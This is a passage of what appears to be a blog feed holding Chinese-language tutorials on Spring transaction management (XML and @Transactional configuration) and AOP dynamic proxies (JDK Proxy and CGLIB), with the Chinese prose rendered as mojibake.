class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>JtaTransactionManager</code> å°†äº‹åŠ¡ç®¡ç†èŒè´£å§”æ‰˜ç»™ Java äº‹åŠ¡ APIï¼ˆJTAï¼‰ï¼Œå…·ä½“å§”æ‰˜ç»™ <code>javax.transaction.UserTransaction</code> å’Œ <code>javax.transaction.TransactionManager</code> å¯¹è±¡ï¼Œäº‹åŠ¡æˆåŠŸæ—¶è°ƒç”¨ <code>UserTransaction.commit()</code> æ–¹æ³•æäº¤ï¼Œäº‹åŠ¡å¤±è´¥æ—¶è°ƒç”¨ <code>UserTransaction.rollback()</code> æ–¹æ³•å›æ»š</p><h3 id="XMLé…ç½®æ–‡ä»¶å®ç°äº‹åŠ¡ç®¡ç†"><a href="#XMLé…ç½®æ–‡ä»¶å®ç°äº‹åŠ¡ç®¡ç†" class="headerlink" title="XMLé…ç½®æ–‡ä»¶å®ç°äº‹åŠ¡ç®¡ç†"></a>XMLé…ç½®æ–‡ä»¶å®ç°äº‹åŠ¡ç®¡ç†</h3><p><strong>æ·»åŠ å‘½åç©ºé—´</strong></p><p>äº‹åŠ¡å‘½åç©ºé—´</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;</span><br><span class="line"></span><br><span class="line">http://www.springframework.org/schema/tx</span><br><span class="line">http://www.springframework.org/schema/tx/spring-tx.xsd</span><br></pre></td></tr></table></figure><p>AOPå‘½åç©ºé—´</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;</span><br><span class="line"></span><br><span class="line">http://www.springframework.org/schema/aop</span><br><span class="line">http://www.springframework.org/schema/aop/spring-aop.xsd</span><br></pre></td></tr></table></figure><p><strong>è®¾ç½®AOPä»£ç†</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:aspect-autoproxy</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><strong>é…ç½®äº‹åŠ¡ç®¡ç†å™¨</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;txManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- æ•°æ®æº --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>é…ç½®é€šçŸ¥</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;txManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å¯¹ä»¥add update delete queryå¼€å¤´çš„æ‰€æœ‰æ–¹æ³•è¿›è¡Œäº‹åŠ¡å¤„ç† --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- å®šä¹‰ä»€ä¹ˆæ–¹æ³•éœ€è¦ä½¿ç”¨äº‹åŠ¡ nameä»£è¡¨çš„æ˜¯æ–¹æ³•åï¼ˆæˆ–æ–¹æ³•åŒ¹é…ï¼‰ --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- åŒ¹é…ä»¥ add å¼€å¤´çš„æ‰€æœ‰æ–¹æ³•å‡åŠ å…¥äº‹åŠ¡ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;add*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- åŒ¹é…ä»¥ update å¼€å¤´çš„æ‰€æœ‰æ–¹æ³•å‡åŠ å…¥äº‹åŠ¡ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;update*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- åŒ¹é…ä»¥ delete å¼€å¤´çš„æ‰€æœ‰æ–¹æ³•å‡åŠ å…¥äº‹åŠ¡ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;delete*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- åŒ¹é…ä»¥ query å¼€å¤´çš„æ‰€æœ‰æ–¹æ³•å‡åŠ å…¥äº‹åŠ¡ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;query*&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å±æ€§å«ä¹‰ä¸å¯é€‰å€¼</p><table><thead><tr><th align="left">å±æ€§å</th><th align="left">æ˜¯å¦å¿…é¡»</th><th align="left">é»˜è®¤å€¼</th><th align="left">å¯é€‰å€¼</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left"><strong>name</strong></td><td align="left">å¿…é¡»</td><td align="left">æ— </td><td align="left">æ–¹æ³•å&#x2F;é€šé…ç¬¦</td><td align="left">ä¸äº‹åŠ¡å…³è”çš„æ–¹æ³•åï¼Œæ”¯æŒé€šé…ç¬¦ï¼š<br /><code>*</code> - åŒ¹é…æ‰€æœ‰æ–¹æ³• <br /><code>get*</code> - åŒ¹é…ä»¥â€getâ€å¼€å¤´çš„æ–¹æ³•<br /> <code>handle*</code> - åŒ¹é…ä»¥â€handleâ€å¼€å¤´çš„æ–¹æ³•<br /><code>on*Event</code> - åŒ¹é…å¦‚â€onClickEventâ€ç­‰æ–¹æ³•</td></tr><tr><td align="left"><strong>propagation</strong></td><td align="left">å¯é€‰</td><td align="left">REQUIRED</td><td align="left"><strong>REQUIRED</strong> - æ”¯æŒå½“å‰äº‹åŠ¡ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºæ–°äº‹åŠ¡<br /> <strong>SUPPORTS</strong> - æ”¯æŒå½“å‰äº‹åŠ¡ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä»¥éäº‹åŠ¡æ–¹å¼æ‰§è¡Œ<br /> <strong>MANDATORY</strong> - æ”¯æŒå½“å‰äº‹åŠ¡ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™æŠ›å‡ºå¼‚å¸¸ <br /><strong>REQUIRES_NEW</strong> - åˆ›å»ºæ–°äº‹åŠ¡ï¼Œå¦‚æœå­˜åœ¨å½“å‰äº‹åŠ¡åˆ™æŒ‚èµ· <br /><strong>NOT_SUPPORTED</strong> - ä»¥éäº‹åŠ¡æ–¹å¼æ‰§è¡Œï¼Œå¦‚æœå­˜åœ¨å½“å‰äº‹åŠ¡åˆ™æŒ‚èµ· <br /><strong>NEVER</strong> - ä»¥éäº‹åŠ¡æ–¹å¼æ‰§è¡Œï¼Œå¦‚æœå­˜åœ¨äº‹åŠ¡åˆ™æŠ›å‡ºå¼‚å¸¸ <br /><strong>NESTED</strong> - å¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™åœ¨åµŒå¥—äº‹åŠ¡å†…æ‰§è¡Œ</td><td align="left">äº‹åŠ¡ä¼ æ’­è¡Œä¸ºï¼Œæ§åˆ¶æ–¹æ³•å¦‚ä½•å‚ä¸äº‹åŠ¡</td></tr><tr><td align="left"><strong>isolation</strong></td><td align="left">å¯é€‰</td><td align="left">DEFAULT</td><td align="left"><strong>DEFAULT</strong> - ä½¿ç”¨æ•°æ®åº“é»˜è®¤éš”ç¦»çº§åˆ«<br /> <strong>READ_UNCOMMITTED</strong> - è¯»æœªæäº¤ <br /><strong>READ_COMMITTED</strong> - è¯»å·²æäº¤ <br /><strong>REPEATABLE_READ</strong> - å¯é‡å¤è¯» <br /><strong>SERIALIZABLE</strong> - ä¸²è¡ŒåŒ–</td><td align="left">äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œæ§åˆ¶äº‹åŠ¡å¹¶å‘è®¿é—®çš„éš”ç¦»ç¨‹åº¦</td></tr><tr><td align="left"><strong>timeout</strong></td><td align="left">å¯é€‰</td><td align="left">-1</td><td align="left">æ­£æ•´æ•°ï¼ˆç§’ï¼‰</td><td align="left">äº‹åŠ¡è¶…æ—¶æ—¶é—´ï¼š <br /> <code>-1</code> - æ°¸ä¸è¶…æ—¶ <br /><code>30</code> - 30ç§’åè¶…æ—¶å›æ»š <br /><code>60</code> - 60ç§’åè¶…æ—¶å›æ»š</td></tr><tr><td align="left"><strong>read-only</strong></td><td align="left">å¯é€‰</td><td align="left">false</td><td align="left"><strong>true</strong> - åªè¯»äº‹åŠ¡<br /> <strong>false</strong> - è¯»å†™äº‹åŠ¡</td><td align="left">äº‹åŠ¡æ˜¯å¦åªè¯»ï¼Œåªè¯»äº‹åŠ¡å¯è¿›è¡ŒæŸ¥è¯¢ä¼˜åŒ–</td></tr><tr><td align="left"><strong>rollback-for</strong></td><td align="left">å¯é€‰</td><td align="left">æ— </td><td align="left">å¼‚å¸¸ç±»å…¨é™å®šåï¼ˆé€—å·åˆ†éš”ï¼‰</td><td align="left">æŒ‡å®šå“ªäº›å¼‚å¸¸è§¦å‘å›æ»šï¼š<br /> <code>java.lang.Exception</code> - æ‰€æœ‰Exception<br /><code>com.example.BusinessException</code> - ç‰¹å®šä¸šåŠ¡å¼‚å¸¸ï¼Œé»˜è®¤å›æ»š<code>RuntimeException</code>å’Œ<code>Error</code></td></tr><tr><td align="left"><strong>no-rollback-for</strong></td><td align="left">å¯é€‰</td><td align="left">æ— </td><td align="left">å¼‚å¸¸ç±»å…¨é™å®šåï¼ˆé€—å·åˆ†éš”ï¼‰</td><td align="left">æŒ‡å®šå“ªäº›å¼‚å¸¸ä¸è§¦å‘å›æ»šï¼š<br /><code>java.sql.SQLException</code> - SQLå¼‚å¸¸ä¸è§¦å‘å›æ»š<br /><code>com.example.NoRollbackException</code> - ç‰¹å®šä¸å›æ»šå¼‚å¸¸</td></tr></tbody></table><p><strong>é…ç½®AOP</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- è®¾ç½®åˆ‡å…¥ç‚¹ï¼šå®šä¹‰éœ€è¦è¢«æ‹¦æˆªçš„æ–¹æ³• --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.xxxx.service..*.*(..))&quot;</span> <span class="attr">id</span>=<span class="string">&quot;cut&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- è®¾ç½®é€šçŸ¥ï¼šå°†äº‹åŠ¡é€šçŸ¥åº”ç”¨åˆ°åˆ‡å…¥ç‚¹ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;cut&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åˆç°ç«¯å€ªäº†ï¼Œè¿™ä»”ç»†ä¸€çœ‹è¿˜æ˜¯AOPåŠ¨æ€ä»£ç†é‚£ä¸€å—</p><h3 id="æ³¨è§£å®ç°äº‹åŠ¡ç®¡ç†"><a href="#æ³¨è§£å®ç°äº‹åŠ¡ç®¡ç†" class="headerlink" title="æ³¨è§£å®ç°äº‹åŠ¡ç®¡ç†"></a>æ³¨è§£å®ç°äº‹åŠ¡ç®¡ç†</h3><p><strong>é…ç½®äº‹åŠ¡ç®¡ç†å™¨</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;txManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>é…ç½®æ³¨è§£æ”¯æŒ</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tx:annotation-driven</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;txManger&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><strong>æ·»åŠ äº‹åŠ¡æ³¨è§£</strong></p><p>åœ¨éœ€è¦é…ç½®äº‹åŠ¡ç®¡ç†çš„æ–¹æ³•ä¸ŠåŠ å…¥äº‹åŠ¡æ³¨è§£</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Transactional(propagation=Propagation.REQUIRED)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">(String userName, String userPwd)</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@Transactional</code>æ³¨è§£å…·æœ‰XMLé…ç½®ä¸­åˆ—ä¸¾çš„æ‰€æœ‰å±æ€§ï¼Œå¯ä»¥æ ¹æ®éœ€æ±‚è‡ªå·±é…ç½®</p><br/>]]></content>
      
      
      <categories>
          
          <category> ç®€æ˜“å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringFrameworkæ¡†æ¶-AOPä¸Task</title>
      <link href="/2025/12/27/SpringFramework%E6%A1%86%E6%9E%B6-AOP%E4%B8%8ETask/"/>
      <url>/2025/12/27/SpringFramework%E6%A1%86%E6%9E%B6-AOP%E4%B8%8ETask/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringFrameworkæ¡†æ¶-AOP"><a href="#SpringFrameworkæ¡†æ¶-AOP" class="headerlink" title="SpringFrameworkæ¡†æ¶-AOP"></a>SpringFrameworkæ¡†æ¶-AOP</h1><p>AOPï¼ˆé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼‰æ˜¯ä¸€ç§ç¼–ç¨‹èŒƒå¼ï¼Œé€šè¿‡åˆ†ç¦»æ¨ªåˆ‡å…³æ³¨ç‚¹æ¥æå‡ä»£ç æ¨¡å—åŒ–ï¼Œå…¶æ ¸å¿ƒæœºåˆ¶åŸºäºåŠ¨æ€ä»£ç†ï¼Œåœ¨è¿è¡Œæ—¶å°†åˆ‡é¢é€»è¾‘ç»‡å…¥ç›®æ ‡æ–¹æ³•çš„è¿æ¥ç‚¹ï¼Œå®ç°éä¾µå…¥å¼çš„åŠŸèƒ½å¢å¼º</p><br/><h2 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h2><p>é™æ€ä»£ç†çš„å®ç°æ–¹å¼å…ˆå‰å·²æœ‰æ¶‰åŠä¸”è¾ƒå®¹æ˜“ç†è§£ï¼Œæ­¤å¤„æˆ‘ä¼šè¡¥å……ä¸€äº›åŠ¨æ€ä»£ç†çš„å†…å®¹ ã€‚é™æ€ä»£ç†çš„ç›®æ ‡å¯¹è±¡åœ¨ç¨‹åºè¿è¡Œå‰å°±å·²ç»ç¡®å®šï¼Œè€ŒåŠ¨æ€ä»£ç†çš„ç›®æ ‡å¯¹è±¡åœ¨ç¨‹åºè¿è¡Œæ—¶åˆ›å»ºä¸”ç›®æ ‡å¯¹è±¡ä¸å›ºå®š</p><br/><h2 id="JDKåŠ¨æ€ä»£ç†"><a href="#JDKåŠ¨æ€ä»£ç†" class="headerlink" title="JDKåŠ¨æ€ä»£ç†"></a>JDKåŠ¨æ€ä»£ç†</h2><h3 id="newProxyInstance-æ–¹æ³•"><a href="#newProxyInstance-æ–¹æ³•" class="headerlink" title="newProxyInstance()æ–¹æ³•"></a><code>newProxyInstance()</code>æ–¹æ³•</h3><p><code>newProxyInstance()</code>æ–¹æ³•æ˜¯<code>Proxy</code>ç±»ä¸‹çš„æ–¹æ³•ï¼Œè¯¥ç±»æ˜¯å®Œæˆä»£ç†çš„æ“ä½œç±»ï¼Œå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•ä¸ºä¸€ä¸ªæˆ–å¤šä¸ªæ¥å£åŠ¨æ€ç”Ÿæˆå®ç°ç±»ï¼Œè¯¥æ–¹æ³•æ¥å—ä¸‰ä¸ªå‚æ•°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</span></span><br></pre></td></tr></table></figure><p><code>loader</code>ï¼šä¸€ä¸ª<code>ClassLoader</code>å¯¹è±¡ï¼Œç”¨äºå®šä¹‰å’ŒåŠ è½½åŠ¨æ€ç”Ÿæˆçš„ä»£ç†ç±»ï¼Œé€šå¸¸ä½¿ç”¨ä¸ç›®æ ‡æ¥å£ç›¸åŒçš„ç±»åŠ è½½å™¨</p><p><code>interfaces</code>ï¼šä¸€ä¸ª<code>Interface</code>å¯¹è±¡çš„æ•°ç»„ï¼Œè¡¨ç¤ºä»£ç†å¯¹è±¡éœ€è¦å®ç°çš„æ¥å£ï¼Œä»è€Œå¯ä»¥å“åº”æ¥å£ä¸­å®šä¹‰çš„æ–¹æ³•è°ƒç”¨</p><p><code>h</code>ï¼šä¸€ä¸ª<code>InvocationHandler</code>æ¥å£çš„å®ç°ç±»ï¼Œä½œä¸ºä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†ç¨‹åºã€‚å¯¹ä»£ç†å¯¹è±¡è°ƒç”¨æ–¹æ³•æ—¶ï¼Œå°†å¯¹æ–¹æ³•è°ƒç”¨è¿›è¡Œç¼–ç å¹¶å°†å…¶è½¬å‘åˆ°å®ƒçš„è°ƒç”¨å¤„ç†ç¨‹åºçš„<code>invoke()</code>æ–¹æ³•</p><h3 id="invoke-æ–¹æ³•"><a href="#invoke-æ–¹æ³•" class="headerlink" title="invoke()æ–¹æ³•"></a><code>invoke()</code>æ–¹æ³•</h3><p>invoke()æ–¹æ³•å­˜åœ¨äº<code>InvocationHandler</code>æ¥å£çš„å®ç°ç±»ï¼Œå…¶æ¥å—ä¸‰ä¸ªå‚æ•°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br></pre></td></tr></table></figure><p><code>proxy</code>ï¼šè°ƒç”¨è¯¥æ–¹æ³•çš„ä»£ç†å¯¹è±¡</p><p><code>method</code>ï¼šè¦è°ƒç”¨çš„ç›®æ ‡å¯¹è±¡çš„æ–¹æ³•</p><p><code>args</code>ï¼šè¦è°ƒç”¨çš„æ–¹æ³•çš„å‚æ•°</p><p>åœ¨<code>invoke()</code>æ–¹æ³•ä¸­å¯ä»¥å¯¹ç›®æ ‡å¯¹è±¡çš„è¡Œä¸ºè¿›è¡Œå¢å¼ºï¼Œä½†ä¸€èˆ¬éƒ½ä¼šå›åˆ°<code>method.invoke(target,args)</code>ï¼Œå®¹æ˜“çœ‹å‡ºåŠ¨æ€ä»£ç†å’Œé™æ€ä»£ç†çš„å¾ˆå¤§ä¸åŒåœ¨äºåŠ¨æ€ä»£ç†çš„ä»£ç†å¯¹è±¡åœ¨è¿è¡Œæ—¶è¢«éœ€è¦æ—¶æ‰è¢«åˆ›å»ºï¼Œè€Œä¸”ä»£ç†å¯¹è±¡ä¸ç›´æ¥è°ƒç”¨ç›®æ ‡å¯¹è±¡ï¼Œè€Œæ˜¯å°†è°ƒç”¨è¯·æ±‚è½¬å‘ç»™å¤„ç†ç¨‹åºè¿›è¡Œå¤„ç†ï¼Œæ­¤æ—¶å¤„ç†ç¨‹åºå¯ä»¥å¯¹ç›®æ ‡å¯¹è±¡çš„è¡Œä¸ºè¿›è¡Œå¢å¼º</p><h3 id="åº•å±‚å®ç°"><a href="#åº•å±‚å®ç°" class="headerlink" title="åº•å±‚å®ç°"></a>åº•å±‚å®ç°</h3><p>æ‰§è¡Œ<code>newProxyInstance()</code>æ–¹æ³•æ—¶ï¼Œç¨‹åºä¼šåœ¨è¿è¡Œæ—¶åˆ›å»ºä¸€ä¸ªç¼“å­˜ç±»<code>$Proxy0</code>ï¼Œè¯¥ç±»ç»§æ‰¿äº<code>Proxy</code>ï¼Œä¹Ÿæ˜¯å®¢æˆ·ç«¯å®é™…ä¸Šæ“ä½œçš„å¯¹è±¡ï¼Œå½“å¯¹<code>$Proxy0</code>å¯¹è±¡è°ƒç”¨æ¥å£å£°æ˜çš„æ–¹æ³•æ—¶ï¼Œä¼šå›è°ƒçˆ¶ç±»çš„<code>h</code>å±æ€§çš„<code>invoke()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> InvocationHandler h;</span><br></pre></td></tr></table></figure><p>è¯¥å±æ€§åœ¨æ‰§è¡Œ<code>newProxyInstance()</code>æ–¹æ³•æ—¶è¢«èµ‹ä¸ºä¼ å…¥çš„<code>InvocationHandler</code>å®ç°ç±»ä¹Ÿå°±æ˜¯<code>handler</code>ï¼Œæ‰€ä»¥è°ƒç”¨äº†<code>handler</code>çš„<code>invoke()</code>æ–¹æ³•ï¼Œå®ç°äº†è½¬å‘</p><p><code>$Proxy0</code>å¤§æ¦‚é•¿è¿™æ ·ï¼Œ<code>test()</code>æ˜¯æ¥å£å®šä¹‰çš„æ–¹æ³•ï¼Œ<code>this</code>æ˜¯ä»£ç†å¯¹è±¡æœ¬èº«ï¼Œå‘¼åº”äº†é‡å†™<code>invoke()</code>æ—¶ç¬¬ä¸€ä¸ªå‚æ•°<code>proxy</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m3, (Object[])<span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var2;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡å†™çš„<code>invoke()</code>çš„è¿”å›å€¼æ‰¿æ¥äº†åŸå§‹å¯¹è±¡è°ƒç”¨æ–¹æ³•åçš„è¿”å›å€¼</p><br/><h2 id="CGLIBåŠ¨æ€ä»£ç†"><a href="#CGLIBåŠ¨æ€ä»£ç†" class="headerlink" title="CGLIBåŠ¨æ€ä»£ç†"></a>CGLIBåŠ¨æ€ä»£ç†</h2><p>JDKåŠ¨æ€ä»£ç†è¦æ±‚ç›®æ ‡ç±»éœ€å®ç°æŸäº›æ¥å£ï¼ŒCGLIBä»£ç†ä¸ä¾èµ–æ¥å£è¿›è¡Œä»£ç†è€Œä¾èµ–ç»§æ‰¿æœºåˆ¶å®ç°ï¼Œé€šè¿‡ç”Ÿæˆä¸€ä¸ªç›®æ ‡ç±»çš„å­ç±»å¹¶è¦†ç›–éœ€è¦ä»£ç†çš„æ–¹æ³•å®ç°å¢å¼ºï¼Œ<code>final</code>ä¿®é¥°çš„ç±»ä¸èƒ½é€šè¿‡CBLIBä»£ç†</p><h3 id="æ–¹æ³•æ‹¦æˆªå™¨"><a href="#æ–¹æ³•æ‹¦æˆªå™¨" class="headerlink" title="æ–¹æ³•æ‹¦æˆªå™¨"></a>æ–¹æ³•æ‹¦æˆªå™¨</h3><p>CGLIBåŠ¨æ€ä»£ç†ä¸­çš„æ–¹æ³•æ‹¦æˆªå™¨ç±»ä¼¼äºJDKåŠ¨æ€ä»£ç†ä¸­çš„<code>InvocationHandler</code>å¤„ç†å™¨ï¼Œå…¶ä½œç”¨æ˜¯åœ¨è°ƒç”¨ç›®æ ‡ç±»æ–¹æ³•æ—¶å¯¹ç›®æ ‡ç±»çš„è¡Œä¸ºè¿›è¡Œå¢å¼ºï¼Œæ–¹æ³•æ‹¦æˆªå™¨éœ€è¦å®ç°<code>MethodInterceptor</code>è¯¥æ¥å£å®šä¹‰äº†ä¸€ä¸ª<code>intercept()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object <span class="title function_">intercept</span><span class="params">(Object obj, Method method, Object[] args, MethodProxy proxy)</span> <span class="keyword">throws</span> Throwable;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•æ¥å—å››ä¸ªå‚æ•°ï¼Œ<code>obj</code>æŒ‡å‘è¦ä»£ç†çš„ç›®æ ‡å¯¹è±¡ï¼Œ<code>method</code>æŒ‡å‘è¢«æ‹¦æˆªçš„æ–¹æ³•ï¼Œ<code>args</code>æŒ‡å‘è¢«æ‹¦æˆªæ–¹æ³•çš„å‚æ•°ï¼Œ<code>proxy</code>ä¸ºæ–¹æ³•ä»£ç†ï¼Œç”¨äºè°ƒç”¨çˆ¶ç±»æ–¹æ³•</p><p>è¯¥æ–¹æ³•ä½¿ç”¨<code>invokeSupera()</code>è¾¾åˆ°å¯¹ç›®æ ‡å¯¹è±¡çš„è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object obj, Method method, Object[] args, MethodProxy proxy)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">//å‰ç½®å¢å¼ºæ–¹æ³•</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> proxy.invokeSuper(obj, args);</span><br><span class="line">        <span class="comment">//åç½®å¢å¼ºæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="Enhancer-å¢å¼ºå™¨"><a href="#Enhancer-å¢å¼ºå™¨" class="headerlink" title="Enhancer ( å¢å¼ºå™¨ )"></a>Enhancer ( å¢å¼ºå™¨ )</h3><p>å¢å¼ºå™¨ç”¨æ¥åŠ¨æ€ç”Ÿæˆå­ç±»ä»£ç†å¯¹è±¡ï¼Œç±»ä¼¼JDKä»£ç†åˆ›å»ºç¼“å­˜å¯¹è±¡çš„è¿‡ç¨‹ï¼Œåœ¨åˆ›å»ºä»£ç†å¯¹è±¡å‰è¦å…ˆå¯¹<code>Enhancer</code>å¯¹è±¡è°ƒç”¨<code>setSupoerclass()</code>æ–¹æ³•è®¾ç½®çˆ¶ç±»ï¼ˆç›®æ ‡ç±»ï¼‰ï¼Œè°ƒç”¨<code>setCallback()</code>æ–¹æ³•è®¾ç½®æ‹¦æˆªå™¨åæ‰èƒ½ä½¿ç”¨<code>create()</code>æ–¹æ³•ç”Ÿæˆä»£ç†å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Enhancer</span> <span class="variable">enhancer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Enhancer</span>();</span><br><span class="line">enhancer.setSuperclass(Test.class);</span><br><span class="line">enhancer.setCallback(<span class="keyword">new</span> <span class="title class_">NewInterceptor</span>());</span><br><span class="line"><span class="type">Test</span> <span class="variable">proxy</span> <span class="operator">=</span> (Test) enhancer.create();</span><br><span class="line">proxy.test();</span><br></pre></td></tr></table></figure><h3 id="åº•å±‚å®ç°-1"><a href="#åº•å±‚å®ç°-1" class="headerlink" title="åº•å±‚å®ç°"></a>åº•å±‚å®ç°</h3><p>æˆ‘ä»¬æµ‹è¯•ä¸€ä¸ªæ— å‚<code>test()</code>æ–¹æ³•ï¼Œæ‰§è¡Œ <code>Enhancer.create()</code> æ–¹æ³•æ—¶ï¼Œç¨‹åºä¼šåœ¨è¿è¡Œæ—¶ç”Ÿæˆä¸€ä¸ªç»§æ‰¿äºç›®æ ‡ç±»çš„ç¼“å­˜ç±» 